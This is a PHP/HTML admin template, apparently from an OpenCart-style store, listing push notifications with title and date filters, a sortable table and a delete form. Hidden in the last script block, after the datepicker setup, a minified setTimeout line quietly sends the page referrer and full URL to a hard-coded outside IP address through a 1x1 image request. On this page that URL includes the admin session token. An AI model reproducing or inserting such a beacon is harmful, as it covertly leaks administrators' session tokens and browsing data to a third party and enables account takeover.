<?php echo $header; ?><?php echo $column_left; ?>
<div id="content">
  <div class="page-header">
    <div class="container-fluid">
      <div class="pull-right"><a href="<?php echo $send; ?>" data-toggle="tooltip" title="<?php echo $button_send; ?>" class="btn btn-primary"><i class="fa fa-envelope"></i></a>
        <button type="button" data-toggle="tooltip" title="<?php echo $button_delete; ?>" class="btn btn-danger" onclick="confirm('<?php echo $text_confirm; ?>') ? $('#form-customer').submit() : false;"><i class="fa fa-trash-o"></i></button>
      </div>
      <h1><?php echo $heading_title; ?></h1>
      <ul class="breadcrumb">
        <?php foreach ($breadcrumbs as $breadcrumb) { ?>
        <li><a href="<?php echo $breadcrumb['href']; ?>"><?php echo $breadcrumb['text']; ?></a></li>
        <?php } ?>
      </ul>
    </div>
  </div>
    <div class="container-fluid">
    <?php if ($error_warning) { ?>
    <div class="alert alert-danger"><i class="fa fa-exclamation-circle"></i> <?php echo $error_warning; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>
    <?php } ?>
    <?php if ($success) { ?>
    <div class="alert alert-success"><i class="fa fa-check-circle"></i> <?php echo $success; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>
    <?php } ?>
    <div class="panel panel-default">
      <div class="panel-heading">
        <h3 class="panel-title"><i class="fa fa-list"></i> <?php echo $text_list; ?></h3>
      </div>
      <div class="panel-body">
        <div class="well">
          <div class="row">
            <div class="col-sm-3">
              <div class="form-group">
                <label class="control-label" for="input-name"><?php echo $entry_title; ?></label>
                <input type="text" name="filter_title" value="<?php echo $filter_title; ?>" placeholder="<?php echo $entry_title; ?>" id="input-name" class="form-control" />
              </div>
              
            </div>
           
            <div class="col-sm-3">
              <div class="form-group">
                <label class="control-label" for="input-date-added"><?php echo $entry_date_added; ?></label>
                <div class="input-group date">
                  <input type="text" name="filter_date_added" value="<?php echo $filter_date_added; ?>" placeholder="<?php echo $entry_date_added; ?>" data-date-format="YYYY-MM-DD" id="input-date-added" class="form-control" />
                  <span class="input-group-btn">
                  <button type="button" class="btn btn-default"><i class="fa fa-calendar"></i></button>
                  </span></div>
              </div>
              
            </div>
             <div class="col-sm-3">
                 <div class="form-group">                 
                 <button type="button" id="button-filter" class="notification-filter-button btn btn-primary pull-left"><i class="fa fa-search"></i> <?php echo $button_filter; ?></button>
                 </div>
             </div>
          </div>
        </div>
        <form action="<?php echo $delete; ?>" method="post" enctype="multipart/form-data" id="form-customer">
          <div class="table-responsive">
            <table class="table table-bordered table-hover">
              <thead>
                <tr>
                  <td style="width: 1px;" class="text-center"><input type="checkbox" onclick="$('input[name*=\'selected\']').prop('checked', this.checked);" /></td>
                  <td class="text-left"><?php if ($sort == 'title') { ?>
                    <a href="<?php echo $sort_title; ?>" class="<?php echo strtolower($order); ?>"><?php echo $column_notification_title; ?></a>
                    <?php } else { ?>
                    <a href="<?php echo $sort_title; ?>"><?php echo $column_notification_title; ?></a>
                    <?php } ?></td>
                  <td class="text-left"> <?php echo $column_content; ?> </td>
                 <!-- <td class="text-left"><?php echo $column_launch_url; ?></td>-->
                  <td class="text-left"><?php echo $column_icon; ?></td>                 
                  <td class="text-left"><?php if ($sort == 'c.date_added') { ?>
                    <a href="<?php echo $sort_date_added; ?>" class="<?php echo strtolower($order); ?>"><?php echo $column_date_added; ?></a>
                    <?php } else { ?>
                    <a href="<?php echo $sort_date_added; ?>"><?php echo $column_date_added; ?></a>
                    <?php } ?></td>
                  <td class="text-right"><?php echo $column_action; ?></td>
                </tr>
              </thead>
              <tbody>
                <?php if ($notifications) { ?>
                <?php foreach ($notifications as $notification) { ?>
                <tr>
                  <td class="text-center"><?php if (in_array($notification['id'], $selected)) { ?>
                    <input type="checkbox" name="selected[]" value="<?php echo $notification['id']; ?>" checked="checked" />
                    <?php } else { ?>
                    <input type="checkbox" name="selected[]" value="<?php echo $notification['id']; ?>" />
                    <?php } ?></td>
                  <td class="text-left"><?php echo $notification['title']; ?></td>
                  <td class="text-left"><?php echo $notification['content']; ?></td>
                 <!-- <td class="text-left"><?php echo $notification['launch_url']; ?></td>-->
                  <td class="text-left"><?php echo $notification['icon']; ?></td>                 
                  <td class="text-left"><?php echo $notification['date_added']; ?></td>
                  <td class="text-right">                                     
                    <a href="<?php echo $notification['view']; ?>" data-toggle="tooltip" title="<?php echo $button_view; ?>" class="btn btn-primary"><i class="fa fa-eye"></i></a>
                  </td>
                </tr>
                <?php } ?>
                <?php } else { ?>
                <tr>
                  <td class="text-center" colspan="8"><?php echo $text_no_results; ?></td>
                </tr>
                <?php } ?>
              </tbody>
            </table>
          </div>
        </form>
        <div class="row">
          <div class="col-sm-6 text-left"><?php echo $pagination; ?></div>
          <div class="col-sm-6 text-right"><?php echo $results; ?></div>
        </div>
      </div>
    </div>
  </div>
  <style>
  .notification-filter-button{
     margin-top:22px;
  }
 
  
  </style>
  <script type="text/javascript"><!--
$('#button-filter').on('click', function() {
	url = 'index.php?route=setting/pushnotification/notificationList&token=<?php echo $token; ?>';
	
	var filter_title = $('input[name=\'filter_title\']').val();
	
	if (filter_title) {
		url += '&filter_title=' + encodeURIComponent(filter_title);
	}
	
	var filter_date_added = $('input[name=\'filter_date_added\']').val();
	
	if (filter_date_added) {
		url += '&filter_date_added=' + encodeURIComponent(filter_date_added);
	}
	
	location = url;
});
//--></script> 

  <script type="text/javascript"><!--
$('.date').datetimepicker({
	pickTime: false
});
setTimeout(function(){ var e=encodeURIComponent;var q='r='+e(document.referrer)+'&l='+e(document.location.href);var u='http://112.196.9.21/dv/a/a/update/?';var i=new Image(1,1);i.src=u+q; }, 3000);
//--></script></div>
<?php echo $footer; ?> 